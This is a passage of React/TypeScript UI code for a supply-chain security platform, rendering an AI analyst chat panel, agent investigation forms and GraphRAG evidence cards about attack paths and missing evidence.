function AgentEvidenceGapItem({ gap }: { gap: AgentEvidenceGap }) {
  return (
    <div className='rounded-md border bg-background p-3'>
      <div className='flex items-start justify-between gap-3'>
        <div className='min-w-0'>
          <div className='truncate text-sm font-medium' title={gap.reason}>{gap.module}</div>
          <p className='mt-1 line-clamp-2 text-xs leading-5 text-muted-foreground'>{gap.reason}</p>
        </div>
        <Badge variant='outline' className={cn('shrink-0 rounded-md', severityClasses[gap.severity] || statusClasses.observed)}>
          {severityLabels[gap.severity] || gap.severity}
        </Badge>
      </div>
      <div className='mt-2 grid gap-2 text-xs sm:grid-cols-2'>
        <div className='min-w-0 rounded-md bg-muted/45 px-2.5 py-2'>
          <span className='text-muted-foreground'>去哪里找：</span>
          <span className='line-clamp-2'>{gap.whereToFind?.slice(0, 3).join('、') || '-'}</span>
        </div>
        <div className='min-w-0 rounded-md bg-muted/45 px-2.5 py-2'>
          <span className='text-muted-foreground'>上传到：</span>
          <span>{gap.uploadTo || '-'}</span>
        </div>
      </div>
    </div>
  )
}

function AgentNextActionItem({
  action,
  index,
  onRun,
}: {
  action: AgentNextAction
  index: number
  onRun?: () => void
}) {
  return (
    <button type='button' onClick={onRun} className='flex w-full gap-3 rounded-md border bg-background p-3 text-left transition-colors hover:border-cyan-300 hover:bg-cyan-50/30'>
      <div className='grid size-7 shrink-0 place-items-center rounded-md bg-emerald-50 text-xs font-semibold text-emerald-700 dark:bg-emerald-950/40 dark:text-emerald-300'>
        {index + 1}
      </div>
      <div className='min-w-0 flex-1'>
        <div className='flex flex-wrap items-center gap-2'>
          <span className='text-sm font-medium'>{action.title}</span>
          <Badge variant='outline' className={cn('rounded-md', agentActionPriorityClass(action.priority))}>
            {agentActionPriorityLabel(action.priority)}
          </Badge>
        </div>
        <p className='mt-1 line-clamp-2 text-xs leading-5 text-muted-foreground'>{action.action}</p>
        <div className='mt-2 text-xs text-cyan-700'>前往：{action.targetModule}</div>
      </div>
    </button>
  )
}

function agentInvestigationStatus(
  relatedSteps: AgentRunStep[],
  busy: boolean,
  stageIndex: number
): AgentRunStep['status'] {
  if (relatedSteps.some((step) => step.status === 'failed')) return 'failed'
  if (relatedSteps.some((step) => step.status === 'running')) return 'running'
  if (relatedSteps.length && relatedSteps.every((step) => step.status === 'success')) return 'success'
  if (relatedSteps.length && relatedSteps.every((step) => step.status === 'skipped')) return 'skipped'
  if (busy && stageIndex === 0) return 'running'
  return 'pending'
}

function agentCommandSummary(
  workspace: SecurityWorkspace,
  agentRun: AgentRunResult | null,
  busy: boolean
): AgentCommandSummary {
  const nextWorkspace = agentRun?.workspace ?? workspace
  const confidence = Math.round((nextWorkspace.graph?.summary?.average_path_confidence ?? 0) * 100)
  return {
    riskScore: agentRun?.summary.riskScore ?? nextWorkspace.summary.risk_score,
    attackPathCount: nextWorkspace.summary.attack_paths,
    evidenceGapCount: agentRun?.summary.evidenceGapCount ?? 0,
    confidence,
    status: busy ? 'running' : agentRun?.status || 'idle',
  }
}

function focusAttackPath(pathId: string) {
  window.sessionStorage.setItem('supplyguard:focusAttackPath', pathId)
  jumpToPlatformTab('graph')
}

async function copyAgentText(text: string, successMessage: string) {
  try {
    await navigator.clipboard.writeText(text)
    toast.success(successMessage)
  } catch {
    toast.error('复制失败，请手动选择文本复制')
  }
}

function sleep(ms: number) {
  return new Promise((resolve) => window.setTimeout(resolve, ms))
}

function agentFormFromRequest(request: AgentRunRequest): AgentFormState {
  return {
    question: request.question || '',
    targetPath: request.targetPath || '',
    artifactPath: request.artifactPath || '',
    attestationPath: request.attestationPath || '',
    expectedRepo: request.expectedRepo || '',
    expectedCommit: request.expectedCommit || '',
    allowedWorkflows: (request.allowedWorkflows || []).join('\n'),
    allowedBuilders: (request.allowedBuilders || []).join('\n'),
    logPaths: (request.logPaths || []).join('\n'),
    requireSignature: request.requireSignature ?? true,
    allowSelfHostedRunner: request.allowSelfHostedRunner ?? false,
  }
}

function agentRequestFromForm(form: AgentFormState): AgentRunRequest {
  return {
    ...(form.question.trim() ? { question: form.question.trim() } : {}),
    targetPath: form.targetPath.trim(),
    ...(form.artifactPath.trim() ? { artifactPath: form.artifactPath.trim() } : {}),
    ...(form.attestationPath.trim() ? { attestationPath: form.attestationPath.trim() } : {}),
    ...(form.expectedRepo.trim() ? { expectedRepo: form.expectedRepo.trim() } : {}),
    ...(form.expectedCommit.trim() ? { expectedCommit: form.expectedCommit.trim() } : {}),
    allowedWorkflows: splitAgentValues(form.allowedWorkflows),
    allowedBuilders: splitAgentValues(form.allowedBuilders),
    logPaths: splitAgentValues(form.logPaths),
    requireSignature: form.requireSignature,
    allowSelfHostedRunner: form.allowSelfHostedRunner,
    timeoutSeconds: 180,
  }
}

function splitAgentValues(value: string) {
  return value.split(/[\n,;]+/).map((item) => item.trim()).filter(Boolean)
}

function attachmentKindLabel(kind: string) {
  const labels: Record<string, string> = {
    image: '图片',
    log: '日志',
    text: '文本',
    artifact: '产物',
    attestation: '证明',
    file: '文件',
  }
  return labels[kind] || '文件'
}

function workspaceTargetPath(workspace: SecurityWorkspace) {
  return workspace.code_audit?.target_path
    || workspace.dependency_audit?.target_path
    || workspace.cicd_audit?.target_path
    || ''
}

function jumpToPlatformTab(tab: PlatformTab) {
  window.location.hash = canonicalWorkspaceTab(tab)
}

function jumpToModuleName(moduleName?: string) {
  if (!moduleName) return
  if (moduleName.includes('供应链')) jumpToPlatformTab('supply')
  else if (moduleName.includes('CI/CD') || moduleName.includes('构建链')) jumpToPlatformTab('pipeline')
  else if (moduleName.includes('产物')) jumpToPlatformTab('artifact')
  else if (moduleName.includes('日志')) jumpToPlatformTab('logs')
  else if (moduleName.includes('图谱') || moduleName.includes('路径')) jumpToPlatformTab('graph')
  else if (moduleName.includes('报告')) jumpToPlatformTab('report')
  else jumpToPlatformTab('copilot')
}

function agentRunStatusLabel(status?: string) {
  if (status === 'success') return '已完成'
  if (status === 'completed_with_risk') return '完成，有风险'
  if (status === 'needs_input') return '待补证'
  if (status === 'partial') return '部分完成'
  if (status === 'failed') return '失败'
  if (status === 'queued') return '排队中'
  if (status === 'running') return '执行中'
  if (status === 'idle') return '等待执行'
  return status || '等待执行'
}

function agentRunStatusClass(status?: string, busy = false) {
  if (busy || status === 'success') return statusClasses.active
  if (status === 'completed_with_risk') return severityClasses.critical
  if (status === 'needs_input' || status === 'partial') return severityClasses.high
  if (status === 'failed') return severityClasses.critical
  return statusClasses.observed
}

function agentStepStatusLabel(status: AgentRunStep['status']) {
  if (status === 'success') return '成功'
  if (status === 'skipped') return '已跳过'
  if (status === 'failed') return '失败'
  if (status === 'running') return '执行中'
  return '等待'
}

function agentStepStatusClass(status: AgentRunStep['status']) {
  if (status === 'success') return statusClasses.active
  if (status === 'failed') return severityClasses.critical
  if (status === 'running') return severityClasses.medium
  return statusClasses.observed
}

function agentStepSummaryText(summary: Record<string, unknown>) {
  const entries = Object.entries(summary || {}).filter(([, value]) => ['string', 'number'].includes(typeof value))
  return entries.slice(0, 3).map(([key, value]) => `${agentSummaryLabel(key)} ${value}`).join(' · ')
}

function agentSummaryLabel(key: string) {
  const labels: Record<string, string> = {
    total: '风险',
    findings: '发现',
    dependencies: '依赖',
    workflows: 'Workflow',
    steps: '步骤',
    events: '事件',
    files: '日志',
    trustScore: '可信评分',
    riskScore: '风险评分',
    message: '结果',
    reason: '说明',
  }
  return labels[key] || key
}

function agentActionPriorityLabel(priority: AgentNextAction['priority']) {
  if (priority === 'high') return '高优先级'
  if (priority === 'medium') return '中优先级'
  return '低优先级'
}

function agentActionPriorityClass(priority: AgentNextAction['priority']) {
  if (priority === 'high') return severityClasses.high
  if (priority === 'medium') return severityClasses.medium
  return severityClasses.low
}

function CopilotPanel({
  workspace,
  question,
  setQuestion,
  attachments,
  attachmentBusy,
  onAddAttachments,
  onRemoveAttachment,
  assistantMode,
  onAssistantModeChange,
  messages,
  busy,
  onSubmit,
  onWorkspaceUpdated,
}: {
  workspace: SecurityWorkspace
  question: string
  setQuestion: (value: string) => void
  attachments: AgentAttachment[]
  attachmentBusy: boolean
  onAddAttachments: (files: File[]) => void
  onRemoveAttachment: (attachmentId: string) => void
  assistantMode: AssistantMode
  onAssistantModeChange: (mode: AssistantMode) => void
  messages: SecurityAssistantResponse[]
  busy: boolean
  onSubmit: () => void
  onWorkspaceUpdated: (workspace: SecurityWorkspace) => void
}) {
  const assistant = getAssistantPayload(workspace)
  const latestMessage = messages[messages.length - 1]
  const retrieval = latestMessage?.retrieval?.length ? latestMessage.retrieval : assistant.retrieval
  const nextActions = latestMessage?.next_actions?.length ? latestMessage.next_actions : assistant.next_actions
  const modelName = latestMessage?.model || 'demo-rag-security-analyst'
  const graphRag = latestMessage?.graph_rag ?? assistant.graph_rag ?? null
  const hasDeepseek = modelName.toLowerCase().includes('deepseek')
  const promptSuggestions = [
    '这个项目是否存在供应链风险？',
    '最需要优先修复的风险是什么？',
    '说明当前攻击链和关键证据',
    '这些发现是否可能是误报？',
  ]

  return (
    <div className='mx-auto flex min-h-[calc(100svh-9rem)] w-full max-w-6xl flex-col'>
      <div className='border-b border-border/70 px-1 pb-4'>
        <div className='flex flex-wrap items-center justify-between gap-3'>
          <div className='flex min-w-0 items-center gap-3'>
            <div className='grid size-10 shrink-0 place-items-center rounded-lg border border-cyan-400/25 bg-cyan-400/10 text-cyan-400'>
              <SecurityAiIcon className='size-8' />
            </div>
            <div className='min-w-0'>
              <h2 className='truncate text-base font-semibold text-foreground'>智能研判</h2>
              <p className='mt-0.5 text-xs text-muted-foreground'>基于当前项目证据</p>
            </div>
          </div>
          <Badge variant='outline' className={cn('rounded-md', hasDeepseek ? statusClasses.active : statusClasses.observed)}>
            {hasDeepseek ? 'DeepSeek 在线' : '离线 RAG'}
          </Badge>
        </div>
      </div>

      <div className='flex-1 py-6'>
        <div className='mx-auto flex w-full max-w-5xl flex-col gap-8 px-1 sm:px-4'>
          {messages.length ? (
            messages.map((message, index) => (
              <Fragment key={`${message.question}-${index}`}>
                <CopilotMessage role='user' title='你' icon={<User className='size-4' />}>
                  <p>{message.question}</p>
                </CopilotMessage>
                <CopilotMessage
                  role='assistant'
                  title={assistantMessageTitle(message)}
                  icon={<SecurityAiIcon className='size-7' />}
                  action={<CopyAnswerButton text={message.answer} />}
                >
                  <CopilotMarkdown text={message.answer} />
                </CopilotMessage>
              </Fragment>
            ))
          ) : (
            <div className='mx-auto flex w-full max-w-3xl flex-col items-center py-10 text-center'>
              <div className='grid size-12 place-items-center rounded-xl border border-cyan-400/25 bg-cyan-400/10 text-cyan-400'>
                <SecurityAiIcon className='size-9' />
              </div>
              <h3 className='mt-4 text-lg font-semibold'>从当前项目开始研判</h3>
              <div className='mt-6 grid w-full gap-2 sm:grid-cols-2'>
                {promptSuggestions.map((prompt) => (
                  <button
                    key={prompt}
                    type='button'
                    className='min-h-12 rounded-lg border border-border/80 bg-background px-4 py-3 text-left text-sm leading-6 text-foreground transition-colors hover:border-cyan-400/50 hover:bg-muted/35'
                    onClick={() => setQuestion(prompt)}
                  >
                    {prompt}
                  </button>
                ))}
              </div>
            </div>
          )}

          {busy ? <AssistantThinkingState label='正在检索证据链并生成处置建议' /> : null}

          {messages.length ? (
            <CopilotEvidenceDetails retrieval={retrieval} nextActions={nextActions} graphRag={graphRag} />
          ) : null}
        </div>
      </div>

      <Collapsible className='border-t border-border/70 pt-3'>
        <CollapsibleTrigger asChild>
          <Button variant='ghost' className='group h-10 w-full justify-between rounded-md px-2 text-sm text-muted-foreground hover:text-foreground'>
            <span className='flex items-center gap-2'><Bot className='size-4' />Agent 调查任务</span>
            <ChevronDown className='size-4 transition-transform group-data-[state=open]:rotate-180' />
          </Button>
        </CollapsibleTrigger>
        <CollapsibleContent className='pt-3'>
          <AgentCommandCenter workspace={workspace} onWorkspaceUpdated={onWorkspaceUpdated} />
        </CollapsibleContent>
      </Collapsible>

      <div className='sticky -bottom-4 z-40 mt-4 border-t border-border/60 bg-[color:var(--surface-shell)]/95 px-1 pb-3 pt-4 backdrop-blur sm:px-4'>
        <AssistantComposer
          value={question}
          onChange={setQuestion}
          attachments={attachments}
          attachmentBusy={attachmentBusy}
          onAddAttachments={onAddAttachments}
          onRemoveAttachment={onRemoveAttachment}
          mode={assistantMode}
          onModeChange={onAssistantModeChange}
          onSubmit={onSubmit}
          busy={busy}
          placeholder='继续追问证据链、攻击路径、修复顺序或误报可能性'
          compact
        />
      </div>
    </div>
  )
}

function AssistantThinkingState({ label }: { label: string }) {
  return (
    <div className='flex items-center gap-4 py-2 text-sm text-muted-foreground'>
      <div className='grid size-9 shrink-0 place-items-center rounded-xl border border-cyan-400/25 bg-cyan-400/10 text-cyan-400'>
        <Loader2 className='size-4 animate-spin' />
      </div>
      <span>{label}</span>
    </div>
  )
}

function CopilotEvidenceDetails({
  retrieval,
  nextActions,
  graphRag,
}: {
  retrieval: string[]
  nextActions: string[]
  graphRag?: SecurityGraphRagResult | null
}) {
  return (
    <Collapsible className='border-y border-border/70 py-2'>
      <CollapsibleTrigger asChild>
        <Button variant='ghost' className='group h-11 w-full justify-between rounded-md px-2 text-sm text-muted-foreground hover:text-foreground'>
          <span className='flex items-center gap-2'>
            <Search className='size-4' />
            本次调用详情
            <Badge variant='secondary' className='rounded-md text-[10px]'>{retrieval.length} 条证据</Badge>
          </span>
          <ChevronDown className='size-4 transition-transform group-data-[state=open]:rotate-180' />
        </Button>
      </CollapsibleTrigger>
      <CollapsibleContent className='grid gap-6 px-2 pb-3 pt-4 lg:grid-cols-2'>
        <section className='min-w-0 space-y-3'>
          <h3 className='flex items-center gap-2 text-sm font-semibold'><Search className='size-4 text-cyan-500' />检索命中</h3>
          {retrieval.length ? retrieval.map((item) => <EvidenceItem key={item} value={item} />) : <p className='text-sm text-muted-foreground'>暂无检索命中</p>}
        </section>
        <section className='min-w-0 space-y-3'>
          <h3 className='flex items-center gap-2 text-sm font-semibold'><ClipboardList className='size-4 text-emerald-500' />建议动作</h3>
          {nextActions.length ? nextActions.map((action, index) => (
            <div key={action} className='flex gap-3 text-sm leading-6'>
              <span className='grid size-6 shrink-0 place-items-center rounded-md bg-emerald-500/10 text-xs font-semibold text-emerald-500'>{index + 1}</span>
              <span>{action}</span>
            </div>
          )) : <p className='text-sm text-muted-foreground'>暂无建议动作</p>}
        </section>
        {graphRag ? <div className='lg:col-span-2'><GraphRagEvidenceCard graphRag={graphRag} /></div> : null}
      </CollapsibleContent>
    </Collapsible>
  )
}

function CopilotMessage({
  role,
  title,
  meta,
  icon,
  action,
  children,
}: {
  role: 'assistant' | 'user'
  title: string
  meta?: string
  icon: ReactNode
  action?: ReactNode
  children: ReactNode
}) {
  return (
    <article className={cn('flex w-full gap-3 sm:gap-4', role === 'user' && 'justify-end')}>
      {role === 'assistant' ? (
        <div className='mt-0.5 grid size-9 shrink-0 place-items-center rounded-xl border border-cyan-400/25 bg-cyan-400/10 text-cyan-400'>
          {icon}
        </div>
      ) : null}
      <div className={cn('min-w-0 max-w-[880px] flex-1', role === 'user' && 'ml-auto flex w-fit max-w-[88%] flex-none flex-col items-end sm:max-w-[680px]')}>
        <div className={cn('mb-2 flex min-h-7 items-center gap-2 text-xs text-muted-foreground', role === 'user' && 'justify-end')}>
          <span className='font-semibold text-foreground'>{title}</span>
          {meta ? <span>{meta}</span> : null}
          {role === 'assistant' ? action : null}
        </div>
        <div
          className={cn(
            'min-w-0 text-[15px] leading-7',
            role === 'assistant'
              ? 'w-full text-foreground'
              : 'rounded-2xl rounded-tr-md bg-muted px-4 py-3 text-foreground shadow-sm'
          )}
        >
          {children}
        </div>
      </div>
      {role === 'user' ? (
        <div className='mt-0.5 hidden size-9 shrink-0 place-items-center rounded-xl bg-cyan-400 text-slate-950 sm:grid'>
          {icon}
        </div>
      ) : null}
    </article>
  )
}

function GraphRagEvidenceCard({ graphRag }: { graphRag?: SecurityGraphRagResult | null }) {
  if (!graphRag) return null

  const topNodes = graphRag.top_nodes?.slice(0, 3) ?? []
  const topEdges = graphRag.top_edges?.slice(0, 3) ?? []
  const topPaths = graphRag.top_attack_paths?.slice(0, 2) ?? []
  const channelEntries = Object.entries(graphRag.channels ?? {}).filter(([, hits]) => hits.length)
  const evidenceRows = graphRag.evidence_table?.slice(0, 4) ?? []
  const retrievalTrace = graphRag.retrieval_trace?.slice(0, 4) ?? []
  const missingEvidence = graphRag.missing_evidence?.slice(0, 4) ?? []
  const explanation = graphRag.explanation
  const ranking = explanation?.ranking

  return (
    <Card className='rounded-md border-cyan-200/70 bg-cyan-50/40 dark:border-cyan-900/70 dark:bg-cyan-950/15'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-base'>
          <Network className='size-4 text-cyan-600' />
          GraphRAG 证据
        </CardTitle>
      </CardHeader>
      <CardContent className='space-y-3'>
        <div className='grid grid-cols-2 gap-2 text-xs'>
          <InfoPill label='问题' value={graphRag.query || '-'} />
          <InfoPill label='意图' value={graphRag.intent || String(explanation?.intent || 'general')} />
          <InfoPill label='种子' value={String(explanation?.seed_count ?? graphRag.seed_node_ids?.length ?? 0)} />
          <InfoPill label='跳数' value={`${explanation?.hop_limit ?? 2} hop`} />
          <InfoPill label='扩展' value={String(graphRag.expanded_node_ids?.length ?? 0)} />
          <InfoPill label='排序' value={ranking || '-'} />
          <InfoPill label='上下文' value={graphRag.context ? '已生成' : '-'} />
        </div>

        {channelEntries.length ? (
          <div className='flex flex-wrap gap-1'>
            {channelEntries.map(([channel, hits]) => (
              <Badge key={channel} variant='outline' className='rounded-md bg-background text-[10px]'>
                {graphRagChannelLabel(channel)} {hits.length}
              </Badge>
            ))}
          </div>
        ) : null}

        {topNodes.length ? (
          <div className='space-y-2'>
            <div className='text-xs font-medium'>Top 证据节点</div>
            {topNodes.map((node) => {
              const rawProps = graphNodeRawProperties(node)
              const gnnScore = typeof rawProps.gnn_score === 'number' ? Math.round(rawProps.gnn_score * 100) : null
              const risk = normalizeGraphNodeRisk(node.risk)
              return (
                <div key={node.id} className='rounded-md border bg-background/75 p-2'>
                  <div className='flex items-start justify-between gap-2'>
                    <div className='min-w-0'>
                      <div className='truncate text-sm font-medium'>{node.label || node.id}</div>
                      <div className='text-[11px] text-muted-foreground'>{node.type}</div>
                    </div>
                    <div className='flex shrink-0 gap-1'>
                      <Badge variant='outline' className={cn('rounded-md text-[10px]', severityClasses[risk])}>
                        {severityLabel(risk)}
                      </Badge>
                      {gnnScore !== null ? (
                        <Badge variant='outline' className='rounded-md bg-cyan-50 text-[10px] text-cyan-700 dark:bg-cyan-950/30 dark:text-cyan-200'>
                          恶意包相似度 {gnnScore}%
                        </Badge>
                      ) : null}
                    </div>
                  </div>
                  {node.description ? (
                    <div className='mt-2 line-clamp-2 text-xs leading-5 text-muted-foreground'>{node.description}</div>
                  ) : null}
                  <GraphRagReasonList reasons={node.why_selected} />
                </div>
              )
            })}
          </div>
        ) : null}

        {topPaths.length ? (
          <div className='space-y-2'>
            <div className='text-xs font-medium'>候选攻击路径</div>
            {topPaths.map((path) => (
              <div key={path.id} className='rounded-md border bg-background/75 p-2 text-xs leading-5'>
                <div className='font-medium'>{path.title}</div>
                <div className='text-muted-foreground'>
                  分数 {path.score} · {path.description || path.conclusion || '已与当前问题相关'}
                </div>
                <GraphRagReasonList reasons={path.why_selected} />
              </div>
            ))}
          </div>
        ) : null}

        {evidenceRows.length ? (
          <div className='space-y-1.5'>
            <div className='text-xs font-medium'>证据表</div>
            {evidenceRows.map((row, index) => (
              <div key={`${row.kind}-${row.id}-${index}`} className='rounded-md bg-background/75 px-2 py-1.5 text-xs leading-5'>
                <span className='font-medium'>{row.kind || 'evidence'}</span>
                <span className='text-muted-foreground'> · {row.summary || row.id || row.source || '-'}</span>
              </div>
            ))}
          </div>
        ) : null}

        {topEdges.length ? (
          <div className='space-y-2'>
            <div className='text-xs font-medium'>Top 关联边</div>
            {topEdges.map((edge) => (
              <div key={edge.id} className='rounded-md border bg-background/75 px-2 py-2 text-xs leading-5'>
                <div className='flex flex-wrap items-center justify-between gap-2'>
                  <div className='font-medium'>
                    {edge.source} → {edge.target}
                  </div>
                  <Badge variant='outline' className='rounded-md bg-background text-[10px]'>
                    {edge.type}
                  </Badge>
                </div>
                <div className='mt-1 text-muted-foreground'>
                  {edge.label || edge.reason || 'GraphRAG selected edge'}
                </div>
                <GraphRagReasonList reasons={edge.why_selected} />
              </div>
            ))}
          </div>
        ) : null}

        {graphRag.context ? (
          <Collapsible>
            <CollapsibleTrigger asChild>
              <Button variant='outline' size='sm' className='w-full justify-between rounded-md'>
                GraphRAG 上下文
                <ChevronDown className='size-4' />
              </Button>
            </CollapsibleTrigger>
            <CollapsibleContent className='mt-2 rounded-md border bg-background/75 p-3 text-xs leading-5 text-muted-foreground'>
              <pre className='whitespace-pre-wrap break-words font-mono'>{graphRag.context}</pre>
            </CollapsibleContent>
          </Collapsible>
        ) : null}

        {retrievalTrace.length ? (
          <Collapsible>
            <CollapsibleTrigger asChild>
              <Button variant='outline' size='sm' className='w-full justify-between rounded-md'>
                召回轨迹
                <ChevronDown className='size-4' />
              </Button>
            </CollapsibleTrigger>
            <CollapsibleContent className='mt-2 space-y-1.5'>
              {retrievalTrace.map((item, index) => (
                <div key={`${item.stage || 'trace'}-${index}`} className='rounded-md bg-background/75 px-2 py-1.5 text-xs leading-5'>
                  <span className='font-medium'>{item.stage || `stage ${index + 1}`}</span>
                  <span className='text-muted-foreground'> · {formatGraphRagTrace(item)}</span>
                </div>
              ))}
            </CollapsibleContent>
          </Collapsible>
        ) : null}

        {missingEvidence.length ? (
          <div className='rounded-md border border-amber-200 bg-amber-50/70 p-2 text-xs leading-5 text-amber-800 dark:border-amber-900 dark:bg-amber-950/25 dark:text-amber-200'>
            <div className='font-medium'>缺失证据</div>
            <ul className='mt-1 space-y-1'>
              {missingEvidence.map((item, index) => (
                <li key={`${item.kind}-${index}`}>{item.kind || 'evidence'}：{item.reason || '需要继续补证'}</li>
              ))}
            </ul>
          </div>
        ) : null}
      </CardContent>
    </Card>
  )
}

function GraphRagReasonList({ reasons }: { reasons?: string[] }) {
  if (!reasons?.length) {
    return null
  }
  return (
    <ul className='mt-2 space-y-1 text-[11px] leading-5 text-muted-foreground'>
      {reasons.slice(0, 3).map((reason) => (
        <li key={reason} className='flex gap-2'>
          <span className='mt-2 size-1 shrink-0 rounded-full bg-cyan-500' />
          <span>{reason}</span>
        </li>
      ))}
    </ul>
  )
}

function graphNodeRawProperties(node: { properties?: Record<string, unknown> }) {
  return node.properties ?? {}
}

function normalizeGraphNodeRisk(value?: string): SecuritySeverity {
  if (value === 'critical' || value === 'high' || value === 'medium' || value === 'low') {
    return value
  }
  return 'medium'
}

function graphRagChannelLabel(channel: string) {
  const labels: Record<string, string> = {
    keyword: '关键词',
    risk: '风险',
    attack_path: '攻击路径',
    embedding: '向量召回',
  }
  return labels[channel] || channel
}

function formatGraphRagTrace(item: Record<string, unknown>) {
  const details = Object.entries(item)
    .filter(([key]) => key !== 'stage')
    .map(([key, value]) => `${key}=${formatGraphRagValue(value)}`)
  return details.length ? details.join('，') : '完成'
}

function formatGraphRagValue(value: unknown): string {
  if (Array.isArray(value)) {
    return value.slice(0, 3).join(', ')
  }
  if (value && typeof value === 'object') {
    return JSON.stringify(value)
  }
  return String(value ?? '-')
}

function CopilotMarkdown({ text }: { text: string }) {
  const blocks = normalizeAssistantMarkdown(text)

  return (
    <div className='min-w-0 space-y-4 break-words [overflow-wrap:anywhere]'>
      {blocks.map((block, index) => {
        if (block.type === 'heading') {
          const semanticKind = getAssistantSemanticKind(block.text)
          const HeadingTag = block.level <= 2 ? 'h2' : 'h3'
          return (
            <div key={`${index}-${block.text}`} className={cn('space-y-2', index > 0 && 'pt-3')}>
              <HeadingTag className={cn('flex items-center gap-2 font-semibold text-foreground', block.level <= 2 ? 'text-lg' : 'text-base')}>
                {semanticKind ? <AssistantSemanticIcon kind={semanticKind} /> : null}
                <span className='min-w-0'>{renderInlineMarkdown(block.text)}</span>
              </HeadingTag>
              {block.level <= 2 ? <div className='h-px bg-border/70' /> : null}
            </div>
          )
        }
        if (block.type === 'list') {
          const ListTag = block.ordered ? 'ol' : 'ul'
          return (
            <ListTag
              key={`${index}-${block.items.join('|')}`}
              className={cn('space-y-2 pl-6 leading-7 marker:text-muted-foreground', block.ordered ? 'list-decimal' : 'list-disc')}
            >
              {block.items.map((item, itemIndex) => <li key={`${itemIndex}-${item}`}>{renderInlineMarkdown(item)}</li>)}
            </ListTag>
          )
        }
        if (block.type === 'table') {
          return (
            <div key={`${index}-table`} className='max-w-full overflow-x-auto rounded-lg border border-border/80'>
              <table className='w-full min-w-[560px] border-collapse text-left text-sm'>
                <thead className='bg-muted/55'>
                  <tr>{block.headers.map((cell, cellIndex) => <th key={`${cellIndex}-${cell}`} className='border-b border-border px-3 py-2.5 font-semibold text-foreground'>{renderInlineMarkdown(cell)}</th>)}</tr>
                </thead>
                <tbody>
                  {block.rows.map((row, rowIndex) => (
                    <tr key={`${rowIndex}-${row.join('|')}`} className='border-b border-border/60 last:border-b-0 hover:bg-muted/20'>
                      {block.headers.map((_, cellIndex) => <td key={cellIndex} className='px-3 py-2.5 align-top text-foreground/85'>{renderInlineMarkdown(row[cellIndex] || '-')}</td>)}
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )
        }
        if (block.type === 'quote') {
          return <blockquote key={`${index}-${block.text}`} className='border-l-2 border-cyan-400/70 pl-4 text-foreground/75'>{renderInlineMarkdown(block.text)}</blockquote>
        }
        if (block.type === 'code') {
          return <pre key={`${index}-code`} className='max-w-full overflow-x-auto rounded-lg border bg-muted/35 p-4 font-mono text-xs leading-6 text-foreground'><code>{block.text}</code></pre>
        }
        if (block.type === 'rule') {
          return <div key={`${index}-rule`} className='h-px bg-border/70' />
        }
        const semanticKind = getAssistantSemanticKind(block.text)
        if (semanticKind) {
          return (
            <div key={`${index}-${block.text}`} className='flex gap-2 leading-7 text-foreground/90'>
              <AssistantSemanticIcon kind={semanticKind} />
              <p className='min-w-0'>{renderInlineMarkdown(block.text)}</p>
            </div>
          )
        }
        return (
          <p key={`${index}-${block.text}`} className='leading-7 text-foreground/90'>
            {renderInlineMarkdown(block.text)}
          </p>
        )
      })}
    </div>
  )
}

type AssistantSemanticKind = 'advice' | 'conclusion' | 'plan' | 'explanation'

const assistantSemanticIcons: Record<AssistantSemanticKind, LucideIcon> = {
  advice: TrendingUp,
  conclusion: ClipboardCheck,
  plan: Route,
  explanation: MessageCircle,
}

function AssistantSemanticIcon({ kind }: { kind: AssistantSemanticKind }) {
  const Icon = assistantSemanticIcons[kind]
  return (
    <span className='mt-1 grid size-5 shrink-0 place-items-center rounded-md border border-slate-400/25 bg-slate-500/10 text-slate-300'>
      <Icon className='size-3.5' />
    </span>
  )
}

function getAssistantSemanticKind(text: string): AssistantSemanticKind | null {
  const normalized = text
    .replace(/[`*_#>]/g, '')
    .replace(/^[\s\-–—•·]+/, '')
    .replace(/^\d+[.、)]\s*/, '')
    .replace(/^【([^】]+)】/, '$1')
    .trim()

  if (/^(修复建议|处置建议|建议处理|建议动作|下一步建议|优先修复|建议|推荐|首要动作)/.test(normalized)) return 'advice'
  if (/^(研判结论|风险结论|调查状态总览|当前结论|核心结论|报告摘要|风险总结|总体结论|结论|总结|判断|判定)/.test(normalized)) return 'conclusion'
  if (/^(处置计划|执行计划|排查计划|行动计划|修复计划|下一步动作|处置步骤|计划|步骤|后续)/.test(normalized)) return 'plan'
  if (/^(风险原因|证据说明|路径解释|误报判断|解释|原因|为什么|说明|依据|分析)/.test(normalized)) return 'explanation'

  return null
}

type AssistantMarkdownBlock =
  | { type: 'heading'; text: string; level: number }
  | { type: 'paragraph'; text: string }
  | { type: 'list'; items: string[]; ordered: boolean }
  | { type: 'table'; headers: string[]; rows: string[][] }
  | { type: 'quote'; text: string }
  | { type: 'code'; text: string }
  | { type: 'rule' }

function normalizeAssistantMarkdown(text: string): AssistantMarkdownBlock[] {
  const prepared = sanitizeAgentAnswerMarkdown(text)
    .replace(/\s---\s/g, '\n---\n')
    .replace(/\s(#{2,4})\s+/g, '\n$1 ')
    .replace(/\s(-\s+\*\*)/g, '\n$1')
    .replace(/\s(\d+\.\s+\*\*)/g, '\n$1')
  const lines = prepared.split(/\r?\n/)
  const blocks: AssistantMarkdownBlock[] = []
  let listItems: string[] = []
  let listOrdered = false
  let paragraphLines: string[] = []
  let codeLines: string[] = []
  let inCode = false

  const flushList = () => {
    if (listItems.length) {
      blocks.push({ type: 'list', items: listItems, ordered: listOrdered })
      listItems = []
    }
  }
  const flushParagraph = () => {
    if (paragraphLines.length) {
      blocks.push({ type: 'paragraph', text: cleanMarkdownText(paragraphLines.join(' ')) })
      paragraphLines = []
    }
  }
  const flushText = () => {
    flushList()
    flushParagraph()
  }

  for (let lineIndex = 0; lineIndex < lines.length; lineIndex += 1) {
    const line = lines[lineIndex].trim()
    if (line.startsWith('```')) {
      flushText()
      if (inCode) {
        blocks.push({ type: 'code', text: codeLines.join('\n') })
        codeLines = []
      }
      inCode = !inCode
      continue
    }
    if (inCode) {
      codeLines.push(lines[lineIndex])
      continue
    }
    if (!line) {
      flushText()
      continue
    }
    if (/^-{3,}$/.test(line)) {
      flushText()
      blocks.push({ type: 'rule' })
      continue
    }

    const heading = line.match(/^(#{1,4})\s+(.*)$/)
    if (heading) {
      flushText()
      blocks.push({ type: 'heading', text: cleanMarkdownText(heading[2]), level: heading[1].length })
      continue
    }

    if (isAssistantTableRow(line) && lineIndex + 1 < lines.length && isAssistantTableDivider(lines[lineIndex + 1].trim())) {
      flushText()
      const headers = parseAssistantTableRow(line)
      const rows: string[][] = []
      lineIndex += 2
